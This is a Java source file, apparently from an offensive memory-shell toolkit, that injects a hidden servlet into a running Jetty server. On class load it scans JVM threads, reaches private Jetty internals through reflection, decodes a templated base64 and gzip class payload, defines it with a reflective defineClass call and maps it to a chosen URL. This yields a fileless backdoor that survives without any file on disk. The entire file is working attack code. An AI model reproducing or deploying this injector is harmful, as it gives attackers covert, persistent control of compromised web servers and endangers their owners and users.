package com.reajason.javaweb.memshell.jetty.injector;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.*;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 * @since 2024/12/20
 */
public class JettyServletInjector {

    static {
        new JettyServletInjector();
    }

    public JettyServletInjector() {
        try {
            List<Object> contexts = getContext();
            for (Object context : contexts) {
                Object servlet = getShell(context);
                inject(context, servlet);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() throws IOException {
        return "{{base64Str}}";
    }

    public Class<?> getServletClass(ClassLoader classLoader) throws ClassNotFoundException {
        try {
            return classLoader.loadClass("javax.servlet.Servlet");
        } catch (Throwable e) {
            return classLoader.loadClass("jakarta.servlet.Servlet");
        }
    }

    List<Object> getContext() {
        List<Object> contexts = new ArrayList<Object>();
        Thread[] threads = Thread.getAllStackTraces().keySet().toArray(new Thread[0]);
        for (Thread thread : threads) {
            try {
                Object contextClassLoader = getContextClassLoader(thread);
                if (isWebAppClassLoader(contextClassLoader)) {
                    contexts.add(getContextFromWebAppClassLoader(contextClassLoader));
                } else if (isHttpConnection(thread)) {
                    contexts.add(getContextFromHttpConnection(thread));
                }
            } catch (Exception ignored) {
            }
        }
        return contexts;
    }

    private Object getContextClassLoader(Thread thread) throws Exception {
        return invokeMethod(thread, "getContextClassLoader");
    }

    private boolean isWebAppClassLoader(Object classLoader) {
        return classLoader.getClass().getName().contains("WebAppClassLoader");
    }

    private Object getContextFromWebAppClassLoader(Object classLoader) throws Exception {
        Object context = getFieldValue(classLoader, "_context");
        Object handler = getFieldValue(context, "_servletHandler");
        return getFieldValue(handler, "_contextHandler");
    }

    private boolean isHttpConnection(Thread thread) throws Exception {
        Object threadLocals = getFieldValue(thread, "threadLocals");
        Object table = getFieldValue(threadLocals, "table");
        for (int i = 0; i < Array.getLength(table); ++i) {
            Object entry = Array.get(table, i);
            if (entry != null) {
                Object httpConnection = getFieldValue(entry, "value");
                if (httpConnection != null && httpConnection.getClass().getName().contains("HttpConnection")) {
                    return true;
                }
            }
        }
        return false;
    }

    private Object getContextFromHttpConnection(Thread thread) throws Exception {
        Object threadLocals = getFieldValue(thread, "threadLocals");
        Object table = getFieldValue(threadLocals, "table");
        for (int i = 0; i < Array.getLength(table); ++i) {
            Object entry = Array.get(table, i);
            if (entry != null) {
                Object httpConnection = getFieldValue(entry, "value");
                if (httpConnection != null && httpConnection.getClass().getName().contains("HttpConnection")) {
                    Object httpChannel = invokeMethod(httpConnection, "getHttpChannel");
                    Object request = invokeMethod(httpChannel, "getRequest");
                    Object session = invokeMethod(request, "getSession");
                    Object servletContext = invokeMethod(session, "getServletContext");
                    return getFieldValue(servletContext, "this$0");
                }
            }
        }
        throw new Exception("HttpConnection not found");
    }

    @SuppressWarnings("all")
    private Object getShell(Object context) throws Exception {
        Object obj;
        ClassLoader classLoader = context.getClass().getClassLoader();
        try {
            obj = classLoader.loadClass(getClassName()).newInstance();
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
            obj = clazz.newInstance();
        }
        return obj;
    }


    public void inject(Object context, Object servlet) throws Exception {
        Object servletHandler = getFieldValue(context, "_servletHandler");

        // 1. 判断是否已经注入
        if (isInjected(servletHandler)) {
            System.out.println("servlet is already injected");
            return;
        }

        ClassLoader classLoader = context.getClass().getClassLoader();

        Class<?> servletHolderClass = null;
        try {
            servletHolderClass = classLoader.loadClass("org.eclipse.jetty.servlet.ServletHolder");
        } catch (ClassNotFoundException e) {
            servletHolderClass = classLoader.loadClass("org.mortbay.jetty.servlet.ServletHolder");
        }
        Constructor<?> servletHolderConstructor = servletHolderClass.getDeclaredConstructor();
        servletHolderConstructor.setAccessible(true);
        Object servletHolder = servletHolderConstructor.newInstance();
        invokeMethod(servletHolder, "setServlet", new Class[]{getServletClass(classLoader)}, new Object[]{servlet});
        invokeMethod(servletHolder, "setName", new Class[]{String.class}, new Object[]{getClassName()});
        invokeMethod(servletHandler, "addServlet", new Class[]{servletHolderClass}, new Object[]{servletHolder});
        Class<?> servletMappingClass = null;
        try {
            servletMappingClass = classLoader.loadClass("org.eclipse.jetty.servlet.ServletMapping");
        } catch (ClassNotFoundException e) {
            servletMappingClass = classLoader.loadClass("org.mortbay.jetty.servlet.ServletMapping");
        }
        Constructor<?> servletMappingConstructor = servletMappingClass.getDeclaredConstructor();
        servletMappingConstructor.setAccessible(true);
        Object servletMapping = servletMappingConstructor.newInstance();
        invokeMethod(servletMapping, "setServletName", new Class[]{String.class}, new Object[]{getClassName()});
        invokeMethod(servletMapping, "setPathSpecs", new Class[]{String[].class}, new Object[]{new String[]{getUrlPattern()}});
        invokeMethod(servletHandler, "addServletMapping", new Class[]{servletMappingClass}, new Object[]{servletMapping});
        System.out.println("servlet inject successful");
    }

    @SuppressWarnings("unchecked")
    public boolean isInjected(Object servletHandler) throws Exception {
        Map<String, Object> servletNameMap = (Map<String, Object>) getFieldValue(servletHandler, "_servletNameMap");
        if (servletNameMap == null) {
            return false;
        }
        return servletNameMap.containsKey(getClassName());
    }


    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;

        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
        } finally {
            if (gzipInputStream != null) {
                try {
                    gzipInputStream.close();
                } catch (IOException ignored) {
                }
            }
            out.close();
        }
        return out.toByteArray();
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        for (Class<?> clazz = obj.getClass();
             clazz != Object.class;
             clazz = clazz.getSuperclass()) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException ignored) {

            }
        }
        throw new NoSuchFieldException(name);
    }

    public static Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws NoSuchMethodException {
        try {
            Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
            Method method = null;
            while (clazz != null && method == null) {
                try {
                    if (paramClazz == null) {
                        method = clazz.getDeclaredMethod(methodName);
                    } else {
                        method = clazz.getDeclaredMethod(methodName, paramClazz);
                    }
                } catch (NoSuchMethodException e) {
                    clazz = clazz.getSuperclass();
                }
            }
            if (method == null) {
                throw new NoSuchMethodException("Method not found: " + methodName);
            }
            method.setAccessible(true);
            return method.invoke(obj instanceof Class ? null : obj, param);
        } catch (NoSuchMethodException e) {
            throw e;
        } catch (Exception e) {
            throw new RuntimeException("Error invoking method: " + methodName, e);
        }
    }
}
